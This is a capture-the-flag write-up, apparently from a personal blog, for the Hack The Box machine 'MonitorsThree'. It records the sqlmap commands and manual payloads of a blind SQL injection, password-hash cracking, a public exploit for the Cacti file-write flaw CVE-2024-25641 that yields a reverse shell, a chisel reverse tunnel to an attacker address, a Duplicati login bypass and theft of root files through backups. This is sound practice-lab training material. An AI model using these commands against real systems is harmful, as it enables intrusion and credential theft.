+++
title = 'MonitorsThree'
date = 2024-08-28T20:34:25-04:00
draft = true
tags = ["linux"]
category = ["htb"]
summary = "HTB - Linux - Medium"
+++

Medium rated HTB machine. Foothold involves exploiting a blind SQLi vulnerability to get the password hash for the cacti web application
hosted which has an authenticated arbitrary file write which can lead to php code execution.

Escalation uses the intended functions of a duplicati backup application and is fairly straightforward... access to the application is done through a authentication bypass and is a little more interesting.

# Enum

## Port Scanning
```bash
┌──(fish㉿kali)-[~/htb/monitorsthree]
└─$ nmap -p- -T5 -oN all-ports.nmap $IP    
...
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
8084/tcp  filtered websnp
11794/tcp filtered unknown
...
┌──(fish㉿kali)-[~/htb/monitorsthree]
└─$ nmap -p22,80 -A -oN service-scan.nmap $IP  
...

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 86:f8:7d:6f:42:91:bb:89:72:91:af:72:f3:01:ff:5b (ECDSA)
|_  256 50:f9:ed:8e:73:64:9e:aa:f6:08:95:14:f0:a6:0d:57 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://monitorsthree.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Need to add `monitorsthree.htb` to our /etc/hosts before our dir and vhost enum.
```bash
┌──(fish㉿kali)-[~/htb/monitorsthree]
└─$ echo "$IP monitorsthree.htb" | sudo tee -a /etc/hosts
```

## 80/monitorsthree.htb
```bash
# directory enum
┌──(fish㉿kali)-[~/htb/monitorsthree]
└─$ gobuster dir -u $URL -w /opt/SecLists/Discovery/Web-Content/raft-large-words.txt -t 50 -x php -b 404,403 -o gobuster-80.out 
...
/login.php            (Status: 200) [Size: 4252]
/admin                (Status: 301) [Size: 178] [--> http://monitorsthree.htb/admin/]
/images               (Status: 301) [Size: 178] [--> http://monitorsthree.htb/images/]
/css                  (Status: 301) [Size: 178] [--> http://monitorsthree.htb/css/]
/index.php            (Status: 200) [Size: 13560]
/js                   (Status: 301) [Size: 178] [--> http://monitorsthree.htb/js/]
/.                    (Status: 200) [Size: 13560]
/fonts                (Status: 301) [Size: 178] [--> http://monitorsthree.htb/fonts/]
/forgot_password.php  (Status: 200) [Size: 3030]


```

```bash
# Vhost enum
┌──(fish㉿kali)-[~/htb/monitorsthree]
└─$ ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -u $URL -H 'Host: FUZZ.monitorsthree.htb' -fs 13560
...
cacti                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 27ms]

```

And we find a vhost - `cacti` to add to our enumeration scope and our /etc/hosts file.

Looking at the password recovery feature, we can enumerate the user `admin` as it gives us a different response if the user doesn't exist.... but we could have guessed that as a default username.

![](/Screenshots/MonitorsThree_image_1.png)

Lets take a look at this request with burpsuite.
![](/Screenshots/MonitorsThree_image_2.png)

POST request with a username parameter. We can try running sqlmap against it since we know it is checking for valid usernames.

I copied the contents of the request to a file and can then easily run sqlmap against it

```bash
┌──(fish㉿kali)-[~/htb/monitorsthree]
└─$ sqlmap -r forgot_pass.req 
```

While waiting for sqlmap we can check manually, with the payload `' OR 1=1--` we're able to get an error message -- looks promising. 

![](/Screenshots/MonitorsThree_image_3.png)

SQLmap also finds the parameter vulnerable to a time-based blind query.
![](/Screenshots/MonitorsThree_image_4.png)

We can use sqlmap to dump the databases with this vulnerability but it's slow. With time based blind SQLi, SQLmap will test each character and relies on a delay from a successful query using the sleep() function.

Lets try and dump the `users` table and `password` column:
```bash
┌──(fish㉿kali)-[~/htb/monitorsthree]
└─$ sqlmap -r forgot_pass.req --dump -D monitorsthree_db -T users -C password --batch
```

The second hash returned can be cracked!
```bash
┌──(fish㉿kali)-[~/htb/monitorsthree]
└─$ hashcat hash.txt /usr/share/wordlists/rockyou.txt -m 0  
...
31a181c8372e3afc59dab863430610e8:greencacti2001
```

And we can login to both the default subdomain application and the cactus application with `admin:greencacti2001`


### Cacti
```bash
┌──(fish㉿kali)-[~/htb/monitorsthree]
└─$ gobuster dir -u $URL -w /opt/SecLists/Discovery/Web-Content/raft-large-words.txt -t 50 -x php -b 404,403 -o gobuster-80-cacti.out 
...
/index.php            (Status: 302) [Size: 0] [--> /cacti]
/app                  (Status: 301) [Size: 178] [--> http://cacti.monitorsthree.htb/app/]
/.                    (Status: 302) [Size: 0] [--> /cacti]
/cacti                (Status: 301) [Size: 178] [--> http://cacti.monitorsthree.htb/cacti/]

```
![](/Screenshots/MonitorsThree_image_5.png)

Looks interesting. Looking at the cacti forums, this version released last December
![](/Screenshots/MonitorsThree_image_6.png)


Thanks to a sql injection vulnerability in the other web app, we were able to get a password for the admin user and theres an authenticated file write vuln.
`admin:greencacti2001`.

https://nvd.nist.gov/vuln/detail/CVE-2024-25641
>Prior to version 1.2.27, an arbitrary file write vulnerability, exploitable through the "Package Import" feature, allows authenticated users having the "Import Templates" permission to execute arbitrary PHP code on the web server. The vulnerability is located within the `import_package()` function defined into the `/lib/import.php` script. The function blindly trusts the filename and file content provided within the XML data, and writes such files into the Cacti base path (or even outside, since path traversal sequences are not filtered).


---
# Foothold
Someone else was kind enough to make an exploit for CVE-2024-25641, an arbitrary file write vuln allowing authenticated user's to execute php code - https://github.com/5ma1l/CVE-2024-25641

We need to change the values to our IP and listening port in php/monkey.php.
![](/Screenshots/MonitorsThree_image_7.png)

```bash
┌──(fish㉿kali)-[~/htb/monitorsthree/cacti/CVE-2024-25641]
└─$ python3 exploit.py http://cacti.monitorsthree.htb/cacti admin greencacti2001

```

![](/Screenshots/MonitorsThree_image_8.png)

And we're on the box. Looking at home dirs, there's one other user besides root `marcus`.

Tried the password we already had but no luck switching to marcus.

Linpeas.sh finds an interesting process running on port 8084 `/usr/bin/mono /usr/lib/mono/4.5/xsp4.exe`
![](/Screenshots/MonitorsThree_image_9.png)

![](/Screenshots/MonitorsThree_image_10.png)

Makes sense as it's running a .exe. This appears to be a web app running monodoc

![](/Screenshots/MonitorsThree_image_11.png)


Another listening port on 8200. Looking at a docker-compose.yml file, it's a linuxserver container.

![](/Screenshots/MonitorsThree_image_12.png)

checking out 8200, looks like it's running tiny webserver and is hosting a login

```bash
www-data@monitorsthree:/$ curl -v localhost:8200/login.html
```
![](/Screenshots/MonitorsThree_image_13.png)

We can upload chisel and set up a rev port forward to check out the ports:

```bash
www-data@monitorsthree:/dev/shm$ ./chisel client 10.10.14.7:1080 R:8200:127.0.0.1:8200
...
┌──(fish㉿kali)-[~/htb/monitorsthree]
└─$ ./chisel_amd server --reverse --port 1080 
```

![](/Screenshots/MonitorsThree_image_14.png)

>Duplicati is a backup client that securely stores encrypted, incremental, compressed remote backups of local files on cloud storage services and remote file servers.

Found a sqlite file with config values at `/opt/duplicati/config/`
![](/Screenshots/MonitorsThree_image_15.png)
Transferred the file over with nc, we can then open it with `sqlitebrowser`
Looking at the data gives us some interesting info
![](/Screenshots/MonitorsThree_image_16.png)

```bash
server-passphrase - Wb6e855L3sN9LTaCuwPXuautswTIQbekmMAr7BrK2Ho=
server-passphrase-salt - xTfykWV1dATpFZvPhClEJLJzYA5A4L74hX7FK8XmY0I
```

There's a helpful guide on how to bypass authentication with this info:
https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee

Once we're logged in:
![](/Screenshots/MonitorsThree_image_17.png)

At this point we could probably get root.txt flag but lets get the user first.

Database creds in a cacti config file
```php
$database_type     = 'mysql';
$database_default  = 'cacti';
$database_username = 'cactiuser';
$database_password = 'cactiuser';

```

Should check in case we can get the pass for marcus.

We can login and check for creds:
```bash
www-data@monitorsthree:/dev/shm$ mysql -u cactiuser -p
...
MariaDB [cacti]> select * from user_auth;
...
$2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK
```
![](/Screenshots/MonitorsThree_image_18.png)

And we got a password hash. Moved it to a file on my attack box `marcus.hash` and ran haschat against it
```bash
┌──(fish㉿kali)-[~/htb/monitorsthree]
└─$ hashcat marcus.hash /usr/share/wordlists/rockyou.txt -m 3200   
...
$2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK:12345678910
```

We can switch over to the marcus user using `su`, ssh needs a public key auth

![](/Screenshots/MonitorsThree_image_19.png)

Copied over the user's `id_rsa` key file contents to my local host and used it to SSH to the box
![](/Screenshots/MonitorsThree_image_20.png)

![](/Screenshots/MonitorsThree_image_21.png)




## Exploits
https://github.com/5ma1l/CVE-2024-25641

--- 
# PrivEsc

Since we successfully logged into the duplicati web app, we can perform a backup of the /root directory and restore it to a location we can access.

We need to add a new backup
![](/Screenshots/MonitorsThree_image_22.png)

backup destination `source/dev/shm`
![](/Screenshots/MonitorsThree_image_23.png)

Backup source data `source/root/` 

![](/Screenshots/MonitorsThree_image_24.png)

Rest of the settings can be left as-is and submitted. We should see our new backup configuration saved and we can select run now to trigger it.

![](/Screenshots/MonitorsThree_image_25.png)

We can then try and restore from our new backup

![](/Screenshots/MonitorsThree_image_26.png)
![](/Screenshots/MonitorsThree_image_27.png)

Then choose where we want to restore them to `source/dev/shm:
![](/Screenshots/MonitorsThree_image_28.png)

Hit restore and we can check `/dev/shm` to see if we were successful. 

And we got it.

![](/Screenshots/MonitorsThree_image_29.png)
